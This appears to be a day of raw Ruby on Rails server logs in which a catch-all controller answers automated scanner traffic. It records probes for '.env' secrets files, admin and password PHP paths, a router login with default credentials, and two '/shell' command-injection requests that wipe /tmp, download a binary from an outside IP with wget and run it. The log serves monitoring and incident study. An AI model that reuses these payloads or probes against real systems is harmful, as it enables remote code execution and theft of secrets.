I, [2023-01-25T14:30:46.746961 #1791623]  INFO -- : Started GET "/showLogin.cc" for 185.180.143.8 at 2023-01-25 14:30:46 +0900
I, [2023-01-25T14:30:46.747974 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T14:30:46.748030 #1791623]  INFO -- :   Parameters: {"all"=>"showLogin"}
I, [2023-01-25T14:30:46.748757 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T14:30:46.750059 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.6ms | Allocations: 298)
I, [2023-01-25T14:30:46.750257 #1791623]  INFO -- : Completed 200 OK in 2ms (Views: 1.9ms | Allocations: 507)
I, [2023-01-25T14:37:12.719827 #1791621]  INFO -- : Started GET "/.env" for 185.254.196.115 at 2023-01-25 14:37:12 +0900
I, [2023-01-25T14:37:12.721323 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T14:37:12.721382 #1791621]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-25T14:37:12.722542 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T14:37:12.724200 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.7ms | Allocations: 299)
I, [2023-01-25T14:37:12.724568 #1791621]  INFO -- : Completed 200 OK in 3ms (Views: 2.5ms | Allocations: 521)
I, [2023-01-25T14:37:13.509222 #1791621]  INFO -- : Started POST "/" for 185.254.196.115 at 2023-01-25 14:37:13 +0900
F, [2023-01-25T14:37:13.509573 #1791621] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-25T14:42:11.650154 #1791621]  INFO -- : Started GET "/shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws" for 122.116.33.170 at 2023-01-25 14:42:11 +0900
I, [2023-01-25T14:42:11.651253 #1791621]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-25T14:42:11.651312 #1791621]  INFO -- :   Parameters: {"cd /tmp"=>nil, "rm -rf *"=>nil, "wget 94.158.247.123/jaws"=>nil, "sh /tmp/jaws"=>nil, "all"=>"shell"}
I, [2023-01-25T14:42:11.651917 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T14:42:11.653004 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.1ms | Allocations: 299)
I, [2023-01-25T14:42:11.653199 #1791621]  INFO -- : Completed 200 OK in 2ms (Views: 1.4ms | Allocations: 514)
I, [2023-01-25T14:50:20.012345 #1791621]  INFO -- : Started GET "/.env" for 135.125.217.54 at 2023-01-25 14:50:20 +0900
I, [2023-01-25T14:50:20.013124 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T14:50:20.013174 #1791621]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-25T14:50:20.013968 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T14:50:20.014865 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.0ms | Allocations: 299)
I, [2023-01-25T14:50:20.015155 #1791621]  INFO -- : Completed 200 OK in 2ms (Views: 1.5ms | Allocations: 521)
I, [2023-01-25T14:50:20.543781 #1791621]  INFO -- : Started POST "/" for 135.125.217.54 at 2023-01-25 14:50:20 +0900
F, [2023-01-25T14:50:20.544132 #1791621] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-25T15:20:23.647969 #1791623]  INFO -- : Started GET "/.env" for 135.125.217.54 at 2023-01-25 15:20:23 +0900
I, [2023-01-25T15:20:23.648836 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T15:20:23.648909 #1791623]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-25T15:20:23.649356 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T15:20:23.650174 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-01-25T15:20:23.650376 #1791623]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 521)
I, [2023-01-25T15:20:24.184084 #1791621]  INFO -- : Started POST "/" for 135.125.217.54 at 2023-01-25 15:20:24 +0900
F, [2023-01-25T15:20:24.184443 #1791621] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-25T15:24:17.204711 #1791621]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 43.154.173.181 at 2023-01-25 15:24:17 +0900
I, [2023-01-25T15:24:17.205710 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T15:24:17.205844 #1791621]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-01-25T15:24:17.206485 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T15:24:17.208393 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.9ms | Allocations: 299)
I, [2023-01-25T15:24:17.208901 #1791621]  INFO -- : Completed 200 OK in 3ms (Views: 2.6ms | Allocations: 505)
I, [2023-01-25T15:37:34.425388 #1791621]  INFO -- : Started GET "/" for 185.129.215.178 at 2023-01-25 15:37:34 +0900
I, [2023-01-25T15:37:34.426139 #1791621]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-25T15:37:34.426662 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T15:37:34.427384 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 298)
I, [2023-01-25T15:37:34.427552 #1791621]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 512)
I, [2023-01-25T15:38:56.529009 #1791621]  INFO -- : Started GET "/" for 179.43.177.242 at 2023-01-25 15:38:56 +0900
I, [2023-01-25T15:38:56.529614 #1791621]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-25T15:38:56.530065 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T15:38:56.531435 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.4ms | Allocations: 298)
I, [2023-01-25T15:38:56.531633 #1791621]  INFO -- : Completed 200 OK in 2ms (Views: 1.7ms | Allocations: 512)
I, [2023-01-25T16:35:36.055837 #1791621]  INFO -- : Started GET "/" for 138.197.24.32 at 2023-01-25 16:35:36 +0900
I, [2023-01-25T16:35:36.056789 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T16:35:36.057867 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T16:35:36.059669 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.9ms | Allocations: 299)
I, [2023-01-25T16:35:36.059910 #1791621]  INFO -- : Completed 200 OK in 3ms (Views: 2.7ms | Allocations: 521)
I, [2023-01-25T17:04:38.876689 #1791621]  INFO -- : Started GET "/apis/apps/v1/namespaces/kube-system/daemonsets" for 45.134.140.168 at 2023-01-25 17:04:38 +0900
I, [2023-01-25T17:04:38.877325 #1791621]  INFO -- : Processing by UserController#index as JSON
I, [2023-01-25T17:04:38.877370 #1791621]  INFO -- :   Parameters: {"all"=>"apis/apps/v1/namespaces/kube-system/daemonsets"}
I, [2023-01-25T17:04:38.877972 #1791621]  INFO -- : Completed 406 Not Acceptable in 0ms (Allocations: 186)
F, [2023-01-25T17:04:38.878846 #1791621] FATAL -- :   
ActionController::UnknownFormat (UserController#index is missing a template for this request format and variant.

request.formats: ["application/json"]
request.variant: []):
  
actionpack (6.1.4.4) lib/action_controller/metal/implicit_render.rb:42:in `default_render'
actionpack (6.1.4.4) lib/action_controller/metal/basic_implicit_render.rb:6:in `block in send_action'
<internal:kernel>:90:in `tap'
actionpack (6.1.4.4) lib/action_controller/metal/basic_implicit_render.rb:6:in `send_action'
actionpack (6.1.4.4) lib/abstract_controller/base.rb:228:in `process_action'
actionpack (6.1.4.4) lib/action_controller/metal/rendering.rb:30:in `process_action'
actionpack (6.1.4.4) lib/abstract_controller/callbacks.rb:42:in `block in process_action'
activesupport (6.1.4.4) lib/active_support/callbacks.rb:117:in `block in run_callbacks'
actiontext (6.1.4.4) lib/action_text/rendering.rb:20:in `with_renderer'
actiontext (6.1.4.4) lib/action_text/engine.rb:59:in `block (4 levels) in <class:Engine>'
activesupport (6.1.4.4) lib/active_support/callbacks.rb:126:in `instance_exec'
activesupport (6.1.4.4) lib/active_support/callbacks.rb:126:in `block in run_callbacks'
activesupport (6.1.4.4) lib/active_support/callbacks.rb:137:in `run_callbacks'
actionpack (6.1.4.4) lib/abstract_controller/callbacks.rb:41:in `process_action'
actionpack (6.1.4.4) lib/action_controller/metal/rescue.rb:22:in `process_action'
actionpack (6.1.4.4) lib/action_controller/metal/instrumentation.rb:34:in `block in process_action'
activesupport (6.1.4.4) lib/active_support/notifications.rb:203:in `block in instrument'
activesupport (6.1.4.4) lib/active_support/notifications/instrumenter.rb:24:in `instrument'
activesupport (6.1.4.4) lib/active_support/notifications.rb:203:in `instrument'
actionpack (6.1.4.4) lib/action_controller/metal/instrumentation.rb:33:in `process_action'
actionpack (6.1.4.4) lib/action_controller/metal/params_wrapper.rb:249:in `process_action'
activerecord (6.1.4.4) lib/active_record/railties/controller_runtime.rb:27:in `process_action'
actionpack (6.1.4.4) lib/abstract_controller/base.rb:165:in `process'
actionview (6.1.4.4) lib/action_view/rendering.rb:39:in `process'
actionpack (6.1.4.4) lib/action_controller/metal.rb:190:in `dispatch'
actionpack (6.1.4.4) lib/action_controller/metal.rb:254:in `dispatch'
actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:50:in `dispatch'
actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:33:in `serve'
actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:50:in `block in serve'
actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:32:in `each'
actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:32:in `serve'
actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:842:in `call'
rack (2.2.3) lib/rack/tempfile_reaper.rb:15:in `call'
rack (2.2.3) lib/rack/etag.rb:27:in `call'
rack (2.2.3) lib/rack/conditional_get.rb:27:in `call'
rack (2.2.3) lib/rack/head.rb:12:in `call'
actionpack (6.1.4.4) lib/action_dispatch/http/permissions_policy.rb:22:in `call'
actionpack (6.1.4.4) lib/action_dispatch/http/content_security_policy.rb:18:in `call'
rack (2.2.3) lib/rack/session/abstract/id.rb:266:in `context'
rack (2.2.3) lib/rack/session/abstract/id.rb:260:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/cookies.rb:689:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/callbacks.rb:27:in `block in call'
activesupport (6.1.4.4) lib/active_support/callbacks.rb:98:in `run_callbacks'
actionpack (6.1.4.4) lib/action_dispatch/middleware/callbacks.rb:26:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/actionable_exceptions.rb:18:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/debug_exceptions.rb:29:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/show_exceptions.rb:33:in `call'
railties (6.1.4.4) lib/rails/rack/logger.rb:37:in `call_app'
railties (6.1.4.4) lib/rails/rack/logger.rb:28:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/remote_ip.rb:81:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/request_id.rb:26:in `call'
rack (2.2.3) lib/rack/method_override.rb:24:in `call'
rack (2.2.3) lib/rack/runtime.rb:22:in `call'
activesupport (6.1.4.4) lib/active_support/cache/strategy/local_cache_middleware.rb:29:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/executor.rb:14:in `call'
rack (2.2.3) lib/rack/sendfile.rb:110:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/host_authorization.rb:113:in `call'
railties (6.1.4.4) lib/rails/engine.rb:539:in `call'
puma (5.6.5) lib/puma/configuration.rb:252:in `call'
puma (5.6.5) lib/puma/request.rb:77:in `block in handle_request'
puma (5.6.5) lib/puma/thread_pool.rb:340:in `with_force_shutdown'
puma (5.6.5) lib/puma/request.rb:76:in `handle_request'
puma (5.6.5) lib/puma/server.rb:443:in `process_client'
puma (5.6.5) lib/puma/thread_pool.rb:147:in `block in spawn_thread'
I, [2023-01-25T17:26:57.268273 #1791621]  INFO -- : Started GET "/" for 34.140.248.32 at 2023-01-25 17:26:57 +0900
I, [2023-01-25T17:26:57.268909 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T17:26:57.269375 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T17:26:57.270006 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-01-25T17:26:57.270198 #1791621]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 521)
I, [2023-01-25T17:51:43.072337 #1791621]  INFO -- : Started GET "/.env" for 185.254.196.115 at 2023-01-25 17:51:43 +0900
I, [2023-01-25T17:51:43.072989 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T17:51:43.073034 #1791621]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-25T17:51:43.073458 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T17:51:43.074199 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-01-25T17:51:43.074392 #1791621]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 521)
I, [2023-01-25T17:51:43.726684 #1791621]  INFO -- : Started POST "/" for 185.254.196.115 at 2023-01-25 17:51:43 +0900
F, [2023-01-25T17:51:43.727034 #1791621] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-25T17:53:37.662648 #1791623]  INFO -- : Started GET "/.env" for 135.125.217.54 at 2023-01-25 17:53:37 +0900
I, [2023-01-25T17:53:37.663258 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T17:53:37.663301 #1791623]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-25T17:53:37.663732 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T17:53:37.664383 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-01-25T17:53:37.664563 #1791623]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 521)
I, [2023-01-25T17:53:38.205808 #1791623]  INFO -- : Started POST "/" for 135.125.217.54 at 2023-01-25 17:53:38 +0900
F, [2023-01-25T17:53:38.206283 #1791623] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-25T18:06:08.430390 #1791621]  INFO -- : Started GET "/.env" for 129.146.165.46 at 2023-01-25 18:06:08 +0900
I, [2023-01-25T18:06:08.431010 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T18:06:08.431123 #1791621]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-25T18:06:08.431636 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.1ms | Allocations: 4)
I, [2023-01-25T18:06:08.432303 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-01-25T18:06:08.433385 #1791621]  INFO -- : Completed 200 OK in 2ms (Views: 1.7ms | Allocations: 521)
I, [2023-01-25T18:06:09.097060 #1791623]  INFO -- : Started POST "/" for 129.146.165.46 at 2023-01-25 18:06:09 +0900
F, [2023-01-25T18:06:09.097399 #1791623] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-25T18:13:10.164921 #1791623]  INFO -- : Started GET "/" for 128.1.248.42 at 2023-01-25 18:13:10 +0900
I, [2023-01-25T18:13:10.166088 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T18:13:10.166697 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T18:13:10.169601 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 2.6ms | Allocations: 299)
I, [2023-01-25T18:13:10.170241 #1791623]  INFO -- : Completed 200 OK in 4ms (Views: 3.8ms | Allocations: 521)
I, [2023-01-25T18:14:43.369641 #1791623]  INFO -- : Started GET "/" for 157.230.243.49 at 2023-01-25 18:14:43 +0900
I, [2023-01-25T18:14:43.370228 #1791623]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-25T18:14:43.370650 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T18:14:43.371276 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-01-25T18:14:43.371542 #1791623]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 513)
I, [2023-01-25T19:15:23.394343 #1791621]  INFO -- : Started GET "/.env" for 135.125.217.54 at 2023-01-25 19:15:23 +0900
I, [2023-01-25T19:15:23.395212 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T19:15:23.395259 #1791621]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-25T19:15:23.395704 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T19:15:23.396335 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-01-25T19:15:23.396513 #1791621]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 521)
I, [2023-01-25T19:15:23.960546 #1791621]  INFO -- : Started POST "/" for 135.125.217.54 at 2023-01-25 19:15:23 +0900
F, [2023-01-25T19:15:23.960962 #1791621] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-25T19:40:55.447086 #1791623]  INFO -- : Started GET "/admin/config.php" for 185.224.128.219 at 2023-01-25 19:40:55 +0900
I, [2023-01-25T19:40:55.447688 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T19:40:55.447966 #1791623]  INFO -- :   Parameters: {"all"=>"admin/config"}
I, [2023-01-25T19:40:55.448566 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T19:40:55.450188 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.7ms | Allocations: 298)
I, [2023-01-25T19:40:55.450365 #1791623]  INFO -- : Completed 200 OK in 2ms (Views: 2.0ms | Allocations: 513)
I, [2023-01-25T20:07:16.761022 #1791623]  INFO -- : Started GET "/systembc/password.php" for 45.56.108.128 at 2023-01-25 20:07:16 +0900
I, [2023-01-25T20:07:16.761628 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T20:07:16.761669 #1791623]  INFO -- :   Parameters: {"all"=>"systembc/password"}
I, [2023-01-25T20:07:16.762089 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T20:07:16.762952 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 298)
I, [2023-01-25T20:07:16.763191 #1791623]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 513)
I, [2023-01-25T20:08:58.268975 #1791623]  INFO -- : Started GET "/boaform/admin/formLogin?username=user&psd=user" for 119.250.185.4 at 2023-01-25 20:08:58 +0900
I, [2023-01-25T20:08:58.269597 #1791623]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-25T20:08:58.269641 #1791623]  INFO -- :   Parameters: {"username"=>"user", "psd"=>"user", "all"=>"boaform/admin/formLogin"}
I, [2023-01-25T20:08:58.270049 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T20:08:58.270660 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 298)
I, [2023-01-25T20:08:58.270824 #1791623]  INFO -- : Completed 200 OK in 1ms (Views: 0.9ms | Allocations: 511)
I, [2023-01-25T20:35:21.442682 #1791623]  INFO -- : Started GET "/shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws" for 156.197.196.166 at 2023-01-25 20:35:21 +0900
I, [2023-01-25T20:35:21.443459 #1791623]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-25T20:35:21.443506 #1791623]  INFO -- :   Parameters: {"cd /tmp"=>nil, "rm -rf *"=>nil, "wget 94.158.247.123/jaws"=>nil, "sh /tmp/jaws"=>nil, "all"=>"shell"}
I, [2023-01-25T20:35:21.444116 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T20:35:21.444748 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-01-25T20:35:21.444958 #1791623]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 513)
I, [2023-01-25T20:35:42.195932 #1791623]  INFO -- : Started GET "/.env" for 135.125.217.54 at 2023-01-25 20:35:42 +0900
I, [2023-01-25T20:35:42.196737 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T20:35:42.196796 #1791623]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-25T20:35:42.197555 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T20:35:42.198502 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.0ms | Allocations: 299)
I, [2023-01-25T20:35:42.198964 #1791623]  INFO -- : Completed 200 OK in 2ms (Views: 1.4ms | Allocations: 521)
I, [2023-01-25T20:35:42.746907 #1791621]  INFO -- : Started POST "/" for 135.125.217.54 at 2023-01-25 20:35:42 +0900
F, [2023-01-25T20:35:42.747257 #1791621] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-25T20:39:48.510311 #1791621]  INFO -- : Started GET "/systembc/password.php" for 45.56.108.128 at 2023-01-25 20:39:48 +0900
I, [2023-01-25T20:39:48.510919 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T20:39:48.510961 #1791621]  INFO -- :   Parameters: {"all"=>"systembc/password"}
I, [2023-01-25T20:39:48.511395 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T20:39:48.512780 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.4ms | Allocations: 299)
I, [2023-01-25T20:39:48.512978 #1791621]  INFO -- : Completed 200 OK in 2ms (Views: 1.7ms | Allocations: 514)
I, [2023-01-25T20:47:36.611033 #1791621]  INFO -- : Started GET "/.env" for 95.214.235.205 at 2023-01-25 20:47:36 +0900
I, [2023-01-25T20:47:36.612247 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T20:47:36.612303 #1791621]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-25T20:47:36.612773 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T20:47:36.614079 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.3ms | Allocations: 299)
I, [2023-01-25T20:47:36.614647 #1791621]  INFO -- : Completed 200 OK in 2ms (Views: 1.9ms | Allocations: 521)
I, [2023-01-25T20:47:37.348175 #1791621]  INFO -- : Started POST "/" for 95.214.235.205 at 2023-01-25 20:47:37 +0900
F, [2023-01-25T20:47:37.349357 #1791621] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-25T20:50:27.614295 #1791621]  INFO -- : Started GET "/" for 78.85.150.91 at 2023-01-25 20:50:27 +0900
I, [2023-01-25T20:50:27.614932 #1791621]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-25T20:50:27.616061 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T20:50:27.618123 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 2.7ms | Allocations: 299)
I, [2023-01-25T20:50:27.618327 #1791621]  INFO -- : Completed 200 OK in 3ms (Views: 3.1ms | Allocations: 513)
I, [2023-01-25T21:29:10.489576 #1791621]  INFO -- : Started GET "/.env" for 135.125.217.54 at 2023-01-25 21:29:10 +0900
I, [2023-01-25T21:29:10.490258 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T21:29:10.490301 #1791621]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-25T21:29:10.490789 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T21:29:10.491663 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-01-25T21:29:10.491965 #1791621]  INFO -- : Completed 200 OK in 2ms (Views: 1.3ms | Allocations: 522)
I, [2023-01-25T21:29:11.022343 #1791623]  INFO -- : Started POST "/" for 135.125.217.54 at 2023-01-25 21:29:11 +0900
F, [2023-01-25T21:29:11.022759 #1791623] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-25T21:29:55.302998 #1791623]  INFO -- : Started GET "/" for 170.64.180.61 at 2023-01-25 21:29:55 +0900
I, [2023-01-25T21:29:55.303582 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T21:29:55.304039 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T21:29:55.304940 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-01-25T21:29:55.305328 #1791623]  INFO -- : Completed 200 OK in 2ms (Views: 1.3ms | Allocations: 521)
I, [2023-01-25T21:42:19.071219 #1791623]  INFO -- : Started GET "/" for 37.19.76.75 at 2023-01-25 21:42:19 +0900
I, [2023-01-25T21:42:19.071807 #1791623]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-25T21:42:19.072379 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T21:42:19.073518 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.3ms | Allocations: 299)
I, [2023-01-25T21:42:19.073695 #1791623]  INFO -- : Completed 200 OK in 2ms (Views: 1.6ms | Allocations: 513)
I, [2023-01-25T22:06:24.781389 #1791623]  INFO -- : Started GET "/.env" for 95.214.235.205 at 2023-01-25 22:06:24 +0900
I, [2023-01-25T22:06:24.782008 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T22:06:24.782048 #1791623]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-25T22:06:24.782494 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T22:06:24.783112 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-01-25T22:06:24.783399 #1791623]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 521)
I, [2023-01-25T22:06:25.515781 #1791623]  INFO -- : Started POST "/" for 95.214.235.205 at 2023-01-25 22:06:25 +0900
F, [2023-01-25T22:06:25.516122 #1791623] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-25T23:45:41.814589 #1791621]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 43.154.173.181 at 2023-01-25 23:45:41 +0900
I, [2023-01-25T23:45:41.815208 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T23:45:41.815250 #1791621]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-01-25T23:45:41.820421 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T23:45:41.821569 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 3.8ms | Allocations: 299)
I, [2023-01-25T23:45:41.821764 #1791621]  INFO -- : Completed 200 OK in 6ms (Views: 4.1ms | Allocations: 505)
I, [2023-01-25T23:48:25.918178 #1791621]  INFO -- : Started GET "/" for 91.240.118.111 at 2023-01-25 23:48:25 +0900
I, [2023-01-25T23:48:25.919082 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T23:48:25.919603 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T23:48:25.920560 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.0ms | Allocations: 299)
I, [2023-01-25T23:48:25.920739 #1791621]  INFO -- : Completed 200 OK in 2ms (Views: 1.4ms | Allocations: 521)
